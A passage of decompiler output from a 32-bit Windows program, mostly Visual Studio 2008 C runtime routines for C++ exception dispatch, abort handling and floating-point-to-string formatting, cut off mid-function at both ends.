  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_00417fde();
  return local_20;
}



void FUN_00417fde(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2008 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_004180d9;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_004180d9:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2008 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  TypeDescriptor *pTVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  int iVar4;
  _s_TryBlockMapEntry *p_Var5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var2 = __getptd();
    uVar6 = extraout_var;
    if (p_Var2->_translator != (void *)0x0) {
      p_Var2 = __getptd();
      pvVar3 = (void *)__encoded_null();
      if (((p_Var2->_translator != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar4 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar4 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var5 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {
          pTVar1 = p_Var5->pHandlerArray[p_Var5->nCatches + -1].pType;
          if (((pTVar1 == (TypeDescriptor *)0x0) || (*(char *)&pTVar1[1].pVFTable == '\0')) &&
             ((*(byte *)&p_Var5->pHandlerArray[p_Var5->nCatches + -1].adjectives & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        p_Var5 = p_Var5 + 1;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  int *piVar1;
  _s_FuncInfo *p_Var2;
  uchar uVar3;
  bool bVar4;
  _ptiddata p_Var5;
  int iVar6;
  _s_TryBlockMapEntry *p_Var7;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var8;
  _s_FuncInfo **pp_Var9;
  int unaff_ESI;
  _s_FuncInfo *p_Var10;
  _s_TryBlockMapEntry *unaff_EDI;
  EHRegistrationNode *pEVar11;
  bad_exception in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  HandlerType *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (param_5->maxState <= local_c)) {
    _inconsistency();
  }
  p_Var10 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_004186ca;
  p_Var8 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_00418537;
  iVar6 = *(int *)(param_1 + 0x14);
  if (((iVar6 != 0x19930520) && (iVar6 != 0x19930521)) && (iVar6 != 0x19930522)) goto LAB_00418537;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_00418537;
  p_Var5 = __getptd();
  if (p_Var5->_curexception != (void *)0x0) {
    p_Var5 = __getptd();
    param_1 = (EHExceptionRecord *)p_Var5->_curexception;
    p_Var5 = __getptd();
    param_3 = (_CONTEXT *)p_Var5->_curcontext;
    iVar6 = _ValidateRead(param_1,1);
    if (iVar6 == 0) {
      _inconsistency();
    }
    if ((((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3)) &&
        ((iVar6 = *(int *)((int)param_1 + 0x14), iVar6 == 0x19930520 ||
         ((iVar6 == 0x19930521 || (iVar6 == 0x19930522)))))) && (*(int *)((int)param_1 + 0x1c) == 0)
       ) {
      _inconsistency();
    }
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec == (void *)0x0) goto LAB_00418537;
    p_Var5 = __getptd();
    piVar1 = (int *)p_Var5->_curexcspec;
    p_Var5 = __getptd();
    iVar6 = 0;
    p_Var5->_curexcspec = (void *)0x0;
    uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
    if (uVar3 != '\0') goto LAB_00418537;
    p_Var8 = (_s_FuncInfo *)0x0;
    if (0 < *piVar1) {
      do {
        bVar4 = type_info::operator==
                          (*(type_info **)((int)&p_Var8->maxState + piVar1[1]),
                           (type_info *)&std::bad_exception::RTTI_Type_Descriptor);
        if (bVar4) goto LAB_00418508;
        iVar6 = iVar6 + 1;
        p_Var8 = (_s_FuncInfo *)&p_Var8->pTryBlockMap;
      } while (iVar6 < *piVar1);
    }
    do {
      terminate();
LAB_00418508:
      ___DestructExceptionObject((int *)param_1);
      std::bad_exception::bad_exception((bad_exception *)&stack0xffffffd0,"bad exception");
      __CxxThrowException_8(&stack0xffffffd0,&DAT_004295d4);
LAB_00418537:
      p_Var10 = (_s_FuncInfo *)param_1;
      if (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3)) &&
         ((p_Var2 = *(_s_FuncInfo **)(param_1 + 0x14), p_Var2 == p_Var8 ||
          ((p_Var2 == (_s_FuncInfo *)0x19930521 || (p_Var2 == (_s_FuncInfo *)0x19930522)))))) {
        if (param_5->nTryBlocks != 0) {
          p_Var7 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((p_Var7->tryLow <= local_c) && (local_c <= p_Var7->tryHigh)) {
              local_10 = p_Var7->pHandlerArray;
              for (local_1c = p_Var7->nCatches; 0 < local_1c; local_1c = local_1c + -1) {
                pp_Var9 = *(_s_FuncInfo ***)(*(int *)(param_1 + 0x1c) + 0xc);
                for (local_18 = *pp_Var9; 0 < (int)local_18;
                    local_18 = (_s_FuncInfo *)((int)&local_18[-1].EHFlags + 3)) {
                  pp_Var9 = pp_Var9 + 1;
                  p_Var10 = *pp_Var9;
                  iVar6 = ___TypeMatch((byte *)local_10,(byte *)p_Var10,*(uint **)(param_1 + 0x1c));
                  if (iVar6 != 0) {
                    local_5 = '\x01';
                    CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                            p_Var10,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,unaff_EDI,
                            unaff_ESI,unaff_EBX,(uchar)in_stack_ffffffd0);
                    goto LAB_00418620;
                  }
                }
                local_10 = local_10 + 1;
              }
            }
LAB_00418620:
            p_Var7 = p_Var7 + 1;
          }
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)param_1);
        }
        if ((((local_5 != '\0') || ((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521))
            || (param_5->pESTypeList == (ESTypeList *)0x0)) ||
           (uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI), uVar3 != '\0'))
        goto LAB_004186f6;
        __getptd();
        __getptd();
        p_Var5 = __getptd();
        p_Var5->_curexception = param_1;
        p_Var5 = __getptd();
        p_Var5->_curcontext = param_3;
        pEVar11 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar11 = param_2;
        }
        _UnwindNestedFrames(pEVar11,param_1);
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_00417e6f(param_5->pESTypeList);
        p_Var10 = param_5;
      }
LAB_004186ca:
      if (param_5->nTryBlocks == 0) goto LAB_004186f6;
      p_Var8 = param_5;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var10,param_2,param_3,param_4,param_5,local_c,param_7,param_8)
    ;
LAB_004186f6:
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_0041870e(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_exception::vftable;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)&param_5->EHFlags & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,param_5,param_8,param_6,
                    param_7);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



void FUN_0041884a(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_0042daec);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2008 Release

void __initp_eh_hooks(void)

{
  DAT_0042daec = __encode_pointer(0x418811);
  return;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2008 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if (((byte)DAT_0042be30 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
  if (((byte)DAT_0042be30 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __set_abort_behavior
// 
// Library: Visual Studio 2008 Release

uint __cdecl __set_abort_behavior(uint _Flags,uint _Mask)

{
  uint uVar1;
  
  uVar1 = DAT_0042be30;
  DAT_0042be30 = ~_Mask & DAT_0042be30 | _Flags & _Mask;
  return uVar1;
}



void __cdecl FUN_00418a34(undefined4 param_1)

{
  DAT_0042daf8 = param_1;
  return;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2008 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    _memmove(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,"e+000");
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar3 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar6) {
            iVar3 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_0042db80 & 1) != 0) && (_Dst[2] == '0')) {
          _memmove(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar6 = 0x22;
  }
  *piVar1 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_00418e8f:
    *piVar2 = iVar15;
